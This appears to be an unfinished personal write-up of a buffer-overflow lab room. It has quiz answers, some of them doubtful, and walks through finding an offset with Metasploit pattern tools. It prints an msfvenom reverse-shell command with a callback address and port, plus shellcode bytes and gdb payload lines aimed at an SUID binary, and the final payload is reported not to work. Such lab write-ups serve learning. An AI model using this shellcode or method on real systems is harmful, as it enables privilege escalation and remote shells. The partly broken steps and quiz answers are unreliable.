# Buffer Overflows

### Process Layout
- Where is dynamically allocated memory stored? `heap`
- Where is information about functions(e.g. local arguments) stored? `stack`

### x86-64 Procedures
- what direction does the stack grown(l for lower/h for higher) `l`
- what instruction is used to add data onto the stack? `push`

### Procedures Continued
- What register stores the return address? `rax`

### Overwriting Variables
- What is the minimum number of characters needed to overwrite the variable? `15`

### Buffer Overflows
- Use the above method to open a shell and read the contents of the secret.txt file.<br />
![image](https://github.com/user-attachments/assets/f290f5dd-49d6-46c6-87a9-5b59987db17f)<br />
As we can see `secret.txt` can only be red by user2. However the vulnerable binary, that's owned by user2, can be run by user1 too. Furthermore this binary has the SUID bit set, so it will always run with the privileges of the owner. So the idea is to inject shellcode into the buffer, so that we can spawn a shell as user2, and therefore read the secret.<br />
Step 1: finding the offset.<br />
Let's create a string pattern that will help finding the offset, using a metasploit feature: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`:<br />
![image](https://github.com/user-attachments/assets/85df0227-2bfd-4457-ae84-482c80477ac6)<br />
Now on the target machine open gdb with `gdb -q buffer-overflow`, and type `run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'")`:<br />
Now If I run `info registers`:<br />
![image](https://github.com/user-attachments/assets/87d470e2-531a-4edf-a6be-ba85bb477461)<br />
I can see that it has actually been overwritten by the metasploit pattern. `0x6641396541386541` corresponds to `fA9eA8eA`.  Now we can use another metasploit tool to determine the offset: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6641396541386541`.<br />
![image](https://github.com/user-attachments/assets/d41dc8e0-c2f4-46e8-92fc-e7fc8e28e630)<br />
Now we know that to overwrite the Base Pointer we need 144 bytes. Therefore to overwrite the return address (which is right next to it), we're going to need 144+8 = 152 bytes!<br />
After some tests, I realized that the return address gets overwritten by only 6 bytes instead of 8. I honestly don't know why and couldn't find any explanation online, but I'll just go with it.<br />
Now it's time to create the shell code to spawn a reverse shell. I'll use a msfvenom utility: `msfvenom -p linux/x86/shell_reverse_tcp lhost=10.11.85.53 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode`<br />
![image](https://github.com/user-attachments/assets/7a7a60c6-6c0a-4869-a03a-bf5d6a2423ca)<br />
So we know that this payload is 95 bytes long. Now the next step is to make it a unique string, using a text editor like nano, like so: <br /> 
![image](https://github.com/user-attachments/assets/b5321c59-335a-4266-a9eb-4511de301f0a)<br />
So now the parameters I'm going to use are:

      30 bytes of "A"s
      27 bytes of NOPs
      95 bytes of payload
      6 bytes of return address

The next thing I need to do is to find any address containing a NOP, so that I can use it to overwrite the return address. So on gdb i run: `run $(python -c "print('\x41'*30+'\x90'*27+'\xdb\xda\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x12\xbd\xb3\x76\xf6\xa6\x83\xea\xfc\x31\x6a\x13\x03\xd9\x65\x14\x53\x2c\x51\x2f\x7f\x1d\x26\x83\xea\xa3\x21\xc2\x5b\xc5\xfc\x85\x0f\x50\x4f\xba\xe2\xe2\xe6\xbc\x05\x8a\xf2\x35\xa3\x7f\x6b\x48\x4b\x05\x02\xc5\xaa\x49\xb2\x85\x7d\xfa\x88\x25\xf7\x1d\x23\xa9\x55\xb5\xd2\x85\x2a\x2d\x43\xf5\xe3\xcf\xfa\x80\x1f\x5d\xae\x1b\x3e\xd1\x5b\xd1\x41'+'\x42'*6)")`<br />
Notice that the last 6 bytes of the payload are `\x42`. In fact this is the result of the execution in gdb: <br />
![image](https://github.com/user-attachments/assets/9d64f761-4a8c-44c6-8e6e-55201bd7227d)<br />
The buffer gets overwritten, good. Now I type `x/100x $rsp-200`. This lets me see 100 bytes from the memory location esp-200. It should contain the overwritten buffer, and this is the output: <br />
![image](https://github.com/user-attachments/assets/abe77444-40d8-4211-b72c-d9e4145141bd)<br />
As we can see there are all the "A"s and also the NOPs. We want to overwrite the return address with one of the NOPs. `0x7fffffffe278` seems a good candidate to me. Remember that this architecture uses little endian: <br />
![image](https://github.com/user-attachments/assets/0df5e25e-f961-4e5a-af1e-422d6cc7829a)<br />
So we will overwrite the return address with the following 6 bytes: `\x78\xe2\xff\xff\xff\x7f`. So the final  payload will look something like this: <br /><br />
`run $(python -c "print('\x41'*30+'\x90'*27+'\xdb\xda\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x12\xbd\xb3\x76\xf6\xa6\x83\xea\xfc\x31\x6a\x13\x03\xd9\x65\x14\x53\x2c\x51\x2f\x7f\x1d\x26\x83\xea\xa3\x21\xc2\x5b\xc5\xfc\x85\x0f\x50\x4f\xba\xe2\xe2\xe6\xbc\x05\x8a\xf2\x35\xa3\x7f\x6b\x48\x4b\x05\x02\xc5\xaa\x49\xb2\x85\x7d\xfa\x88\x25\xf7\x1d\x23\xa9\x55\xb5\xd2\x85\x2a\x2d\x43\xf5\xe3\xcf\xfa\x80\x1f\x5d\xae\x1b\x3e\xd1\x5b\xd1\x41'+'\x78\xe2\xff\xff\xff\x7f')")`<br />
DOESNT WORK. 😠<BR />
TO BE CONTINUED. <BR />



### 
